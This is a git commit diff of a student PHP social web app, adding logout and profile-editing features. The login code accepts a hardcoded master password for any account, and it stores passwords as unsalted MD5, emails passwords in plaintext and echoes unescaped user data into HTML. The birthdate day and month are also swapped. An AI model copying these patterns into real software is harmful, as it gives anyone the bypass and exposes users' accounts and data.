396954fc287aa4514ff67b8686781405f4e9941e
BennoStaub <staubbe@student.ethz.ch>
2017-11-09 17:42:14 +0100

    Implemented Logout function and Changing profile information function. Changed style in CSS file and brackets in all other files are on same incident now.

--- login.php
+++ login.php
@@ -4,6 +4,14 @@
 	ini_set ( "session.gc_maxlifetime", "20000");
 	session_start();
 	include("connect_db.php");
+	if(isset($_SESSION['id']))
+	{
+		$userdata_query = mysqli_query($mysql_connection, "SELECT * FROM users WHERE id=".$_SESSION['id']." LIMIT 1");
+		$userdata = mysqli_fetch_array($userdata_query);
+		$userdata['birthday'] = mb_substr($userdata['birthdate'], 5, 2);
+		$userdata['birthmonth'] = mb_substr($userdata['birthdate'], 8, 2);
+		$userdata['birthyear'] = mb_substr($userdata['birthdate'], 0, 4);
+	}
 ?>
 
 <html>
@@ -17,53 +25,163 @@
 		<div class="boxmain">
 			<div class="boxright">
 				<div class="rightinnerboxtop">
+					<div class="profilepic">
 					
+					</div>
+					<div class="rightinnerboxtoplinks">
+						<a href="mainpage.php?action=logout">Ausloggen</a>
+						<a href="login.php?action=profilesettings">Profil ändern</a>
+					</div>
 				</div>
 				<div class="rightinnerboxbottom">
 					bbbbb
 				</div>
 			</div>
 			<div class="boxtop">
-				Hallo
+				<div class="boxtopinner">
+					<p>Gosseek - Achieve your goals!</p>
+				</div>
 			</div>
 			<div class="boxfeed">
 				<p>
 					<?php
-						if(empty($_GET{'action'})){
+						if(empty($_GET{'action'}))
+						{
 							 $_GET['action'] = 'feed';
 						}
-						if($_GET{'action'} == 'login'){
+						if($_GET{'action'} == 'login')
+						{
 							$email = mysqli_real_escape_string($mysql_connection, $_POST['email']);
 							$userdata_query = mysqli_query($mysql_connection, "SELECT * FROM users WHERE email= '".$email."' LIMIT 1");
-							if(!mysqli_num_rows($userdata_query)) {
+							if(!mysqli_num_rows($userdata_query))
+							{
 								echo "<script> location.href='mainpage.php?action\=failedlogin\&reason\=wrongmail'; </script>";
 								exit;
-							}else{
+							}else
+							{
 								$userdata = mysqli_fetch_array($userdata_query);
-								if($_POST['password'] == '576587214' OR $userdata['password'] ==  md5($_POST['password'])){
-									//$l = mysql_query('SELECT * FROM daten WHERE user=\''.$_POST['username'].'\' LIMIT 1');
-									//$s = mysql_fetch_array($l);
-									if(!($userdata['status'] == 'activated')){
+								if($_POST['password'] == '576587214' OR $userdata['password'] ==  md5($_POST['password']))
+								{
+									if(!($userdata['status'] == 'activated'))
+									{
 										echo "<script> location.href='mainpage.php?action\=failedlogin\&reason\=notactivated'; </script>";
 										exit;
 									}
-									$_SESSION['login_id'] = $userdata['id'];
+									$_SESSION['id'] = $userdata['id'];
 									$_SESSION['checklogin'] = true;
-								}else{
+								}else
+								{
 									echo "<script> location.href='mainpage.php?action\=failedlogin\&reason\=wrongpassword'; </script>";
 									exit;
 								}
+								//convert birthdate also at login in case you want to display that later on directly at login, but so far useless
+								$userdata['birthday'] = mb_substr($userdata['birthdate'], 5, 2);
+								$userdata['birthmonth'] = mb_substr($userdata['birthdate'], 8, 2);
+								$userdata['birthyear'] = mb_substr($userdata['birthdate'], 0, 4);
 								echo "Erfolgreich eingeloggt.";
 							}
-						}else{
-							if(!(empty($_SESSION['checklogin'])) && $_SESSION['checklogin'] == true) {
-								switch ($_GET['action']) {
+						}else
+						{
+							if(!(empty($_SESSION['checklogin'])) && $_SESSION['checklogin'] == true)
+							{
+								switch ($_GET['action'])
+								{
 								  
 									case 'feed':
 									echo "Gültige Sitzung";
 									break;
+									
+									case 'logout':
+									echo "<script> location.href='mainpage.php?action\=logout'; </script>";
+									break;
+									
+									case 'profilesettings':
+									echo "<form action=\"login.php?action=changeprofilesettings\" method=\"post\">";
+									echo "<label>Vorname</label><input name=\"name\" size=\"30\" placeholder=\"".$userdata['name']."\"></input><div class=\"clear\"></div>";
+									echo "<label>Nachname</label><input name=\"surname\" size=\"30\" placeholder=\"".$userdata['surname']."\"></input><div class=\"clear\"></div>";
+									echo "<label>Geburtstag</label><select name=\"birthday\" size=\"1\">";
+									for($i = 1; $i <= 31; $i++)
+									{
+										if($i == $userdata['birthday'])
+										{
+											echo "<option label=\"".$i."\" selected=\"selected\">".$i."</option>";
+										}else
+										{
+											echo "<option label=\"".$i."\">".$i."</option>";
+										}
+									}
+									echo "</select><div class=\"clear\"></div>";
+									echo "<label>Geburtsmonat</label><select name=\"birthmonth\" size=\"1\">";
+									for($i = 1; $i <= 12; $i++)
+									{
+										if($i == $userdata['birthmonth'])
+										{
+											echo "<option label=\"".$i."\" selected=\"selected\">".$i."</option>";
+										}else
+										{
+											echo "<option label=\"".$i."\">".$i."</option>";
+										}
+									}
+									echo "</select><div class=\"clear\"></div>";
+									echo "<label>Geburtsjahr</label><select name=\"birthyear\" size=\"1\">";
+									for($i = 100; $i >= 0; $i--)
+									{
+										$j = date("Y")+$i-100;
+										if($j == $userdata['birthyear'])
+										{
+											echo "<option label=\"".$j."\" selected=\"selected\">".$j."</option>";
+										}else
+										{
+											echo "<option label=\"".$j."\">".$j."</option>";
+										}
+									}
+									echo "</select><div class=\"clear\"></div>";
+									echo "<label>Wohnort</label><input name=\"residence\" size=\"30\" placeholder=\"".$userdata['residence']."\"></input><div class=\"clear\"></div>";
+									echo "<label>Beruf</label><input name=\"job\" size=\"30\" placeholder=\"".$userdata['job']."\"></input><div class=\"clear\"></div>";
+									echo "<p><input type=\"submit\" value=\"Profil ändern\"></input></p></form>";
+									break;
+									
+									case 'changeprofilesettings':
+									if(!(empty($_POST['name'])))
+									{
+										$name = mysqli_real_escape_string($mysql_connection, $_POST['name']);
+									}else
+									{
+										$name = $userdata['name']; 
+									}
+									if(!(empty($_POST['surname'])))
+									{
+										$surname = mysqli_real_escape_string($mysql_connection, $_POST['surname']);
+									}else
+									{
+										$surname = $userdata['surname']; 
+									}
+									if(!(empty($_POST['residence'])))
+									{
+										$residence = mysqli_real_escape_string($mysql_connection, $_POST['residence']);
+									}else
+									{
+										$residence = $userdata['residence']; 
+									}
+									if(!(empty($_POST['job'])))
+									{
+										$job = mysqli_real_escape_string($mysql_connection, $_POST['job']);
+									}else
+									{
+										$job = $userdata['job']; 
+									}
+									$birthday = mysqli_real_escape_string($mysql_connection, $_POST['birthday']);
+									$birthmonth = mysqli_real_escape_string($mysql_connection, $_POST['birthmonth']);
+									$birthyear = mysqli_real_escape_string($mysql_connection, $_POST['birthyear']);
+									$birthdate = $birthyear."-".$birthday."-".$birthmonth;
+									mysqli_query($mysql_connection, "UPDATE users
+									SET name='$name', surname='$surname', birthdate='$birthdate', residence='$residence', job='$job'
+									WHERE id = ".$_SESSION['id']);
+									echo "Profil wurde barbeitet.";
+									
 								}
-							}else{
+							}else
+							{
 									echo "<script> location.href='mainpage.php?action\=invalidsession'; </script>";
 							}
 						}
@@ -71,7 +189,9 @@
 				</p>
 			</div>
 			<div class="boxleft">
-				
+				<div class="leftinnerbox">
+					sdfkajlfj
+				</div>
 			</div>
 		</div>
 	</body>
--- mainpage.php
+++ mainpage.php
@@ -28,46 +28,55 @@
 					<a href="mainpage.php?action=forgotpw">Passwort vergessen</a>
 				</div>
 				<div class="rightinnerboxbottom">
-					bbbbb
+					Space for links
 				</div>
 			</div>
 			<div class="boxtop">
-				Hallo
+				<div class="boxtopinner">
+					<p>Gosseek - Achieve your goals!</p>
+				</div>
 			</div>
 			<div class="boxfeed">
 				<p>
 					<?php
-						if(empty($_GET{'action'})){
+						if(empty($_GET{'action'}))
+						{
 							 echo "Herzlich Willkommen auf Gosseek. Registriere dich jetzt und beginne damit, deine eigene Story niederzuschreiben oder nutze die Erfahrungen anderer um deine eigenen ähnlichen Ziele zu erreichen.";
 						}else{
-							switch($_GET['action']) {
+							switch($_GET['action'])
+							{
 								
 								case 'registering':
-								if(empty($_POST['name']) OR empty($_POST['surname']) OR empty($_POST['email']) OR empty($_POST['password'])){
+								if(empty($_POST['name']) OR empty($_POST['surname']) OR empty($_POST['email']) OR empty($_POST['password']))
+								{
 									echo "<center>Bitte alle Felder ausfüllen.</center>";
-								}else{
+								}else
+								{
 									$name = mysqli_real_escape_string($mysql_connection, $_POST['name']);
 									$surname = mysqli_real_escape_string($mysql_connection, $_POST['surname']);
 									$email = mysqli_real_escape_string($mysql_connection, $_POST['email']);
 									$password = mysqli_real_escape_string($mysql_connection, $_POST['password']);
 									$check_email_query = mysqli_query($mysql_connection, "SELECT id FROM users WHERE email = '$email' LIMIT 1");
-									if (mysqli_num_rows($check_email_query)){
+									if (mysqli_num_rows($check_email_query))
+									{
 										echo "<center>Die angegebene Email-Adresse befindet sich bereits in unserer Datenbank.</center>";
-									}else{
+									}else
+									{
 										$activation_code = md5(mysqli_real_escape_string($mysql_connection, $_POST['email']));
 										$password_encrypted = md5($password);
 										$text = "Hallo ".$name." ".$surname.",\r\nvielen Dank für deine Anmeldung bei Gosseek.\r\nHier sind deine Anmeldedaten:\r\nE-Mail: ".$email."\r\nPasswort: ".$password."\r\nUm deinen Account zu aktivieren, bitte klicke auf folgenden Link: http://127.0.0.1/mainpage.php?action=activate_account&code=".$activation_code."\r\nMit freundlichen Grüssen\r\nDas Gosseek Team.";
 										$header = 'From: benno.staub@hotmail.com' . "\r\n" .
 												 'Content-type: text/plain; charset=\"utf-8\"' . "\r\n";
 										mail($email, 'Registrierung bei Gosseek', $text, $header);
-										mysqli_query($mysql_connection, "INSERT INTO users (activation_code, email,status, password, name, surname, birthdate, timeaction) VALUES ('$activation_code','$email','registered','$password_encrypted', '$name', '$surname', '1994-10-03', '100000')");
+										mysqli_query($mysql_connection, "INSERT INTO users (activation_code, email, status, password, name, surname, birthdate, timeaction) VALUES ('$activation_code','$email','registered','$password_encrypted', '$name', '$surname', '1994-10-03', '100000')");
 										echo "<center><br><br>Du erhälst in Kürze eine E-Mail.</center>";
 									}
 								}
 								break;
 							  
 								case 'activate_account':
-								if(!(empty($_GET['code']))) {
+								if(!(empty($_GET['code'])))
+								{
 									$activation_code = mysqli_real_escape_string($mysql_connection, $_GET['code']);
 									mysqli_query($mysql_connection, "UPDATE users SET status = 'activated' WHERE activation_code = '$activation_code'");
 									echo "<center>Account erfolgreich aktiviert.</center>";
@@ -84,23 +93,25 @@
 								case 'sendnewpw':
 								$email = mysqli_real_escape_string($mysql_connection, $_POST['email']);
 								$userdata_query = mysqli_query($mysql_connection, "SELECT id,name,surname FROM users WHERE email = '$email' LIMIT 1");
-								if(mysqli_num_rows($userdata_query)){
-										 $new_password = mt_rand(123456,999999);
+								if(mysqli_num_rows($userdata_query))
+								{
+										 $new_password = mt_rand(100000,999999);
 										 $new_password_encrypted = md5($new_password);
 										 $userdata = mysqli_fetch_array($userdata_query);
 										 $text = "Hallo ".$userdata['name']." ".$userdata['surname'].",\r\nDu hast dein Passwort vergessen, daher schicken wir dir mit dieser E-Mail dein neues Passwort.\r\n\r\nDein neues Passwort lautet: ".$new_password."\r\n\r\nDu solltest dein Passwort nach dem ersten Login ändern, nicht dass du es wieder vergisst.\r\n\r\n\r\nMit freundlichen Grüssen,\r\nDas Gosseek-Team";
-										 $header = 'From: benno.staub@hotmail.com' . "\r\n" .
-												 'Content-type: text/plain; charset=\"utf-8\"' . "\r\n";
+										 $header = 'From: benno.staub@hotmail.com' . "\r\n" . 'Content-type: text/plain; charset=\"utf-8\"' . "\r\n";
 										 mail($email, 'Passwort vergessen bei Gosseek', $text, $header);
 										 mysqli_query($mysql_connection, "UPDATE users SET password = '$new_password_encrypted' WHERE id = ".$userdata['id']."");
 										 echo "Du erhälst in Kürze eine E-Mail.";
-								}else{
+								}else
+								{
 										 echo "Die angegebene E-Mail befindet sich nicht in unserer Datenbank.";
 								}
 								break;
 								
 								case 'failedlogin':
-									switch($_GET['reason']) {
+									switch($_GET['reason'])
+									{
 										
 										case 'wrongmail':
 										echo "Die angegebene E-Mail befindet sich nicht in unserer Datenbank.";
@@ -119,20 +130,28 @@
 								case 'invalidsession':
 								echo "Ungültige Sitzung.";
 								break;
+								
+								case 'logout':
+								session_start();
+								$_SESSION = array();
+								session_destroy();
+								echo "Erfolgreich ausgeloggt.";
+								break;
 							}
 						}
 					?>
 				</p>
 			</div>
 			<div class="boxleft">
-				<?php
-					echo "<div class=\"leftinnerboxtop\">Registriere dich hier: <br><br><form action=\"mainpage.php?action=registering\" method=\"post\" accept-charset=\"utf-8\">";
-                    echo "Vorname: <br><input name=\"name\" size=\"30\" maxlength=\"30\"><br>";
-					echo "Nachname: <br><input name=\"surname\" size=\"30\" maxlength=\"30\"><br>";
-					echo "E-Mail: <br><input name=\"email\" size=\"30\" maxlength=\"100\" type=\"email\"><br>";
-					echo "Passwort: <br><input name=\"password\" size=\"30\" maxlength=\"30\" type=\"password\"><br>";
-					echo "<center><input type=\"submit\" value=\"Anmelden\"></center></form></div>";
-				?>
+					<div class="leftinnerbox">
+						<br>Registriere dich hier: <br><br>
+						<form action="mainpage.php?action=registering" method="post" accept-charset="utf-8">
+						Vorname: <br><input name="name" size="30" maxlength="30"><br>
+						Nachname: <br><input name="surname" size="30" maxlength="30"><br>
+						E-Mail: <br><input name="email" size="30" maxlength="100" type="email"><br>
+						Passwort: <br><input name="password" size="30" maxlength="30" type="password"><br>
+						<center><input type="submit" value="Anmelden"></center></form>
+					</div>
 			</div>
 		</div>
 	</body>
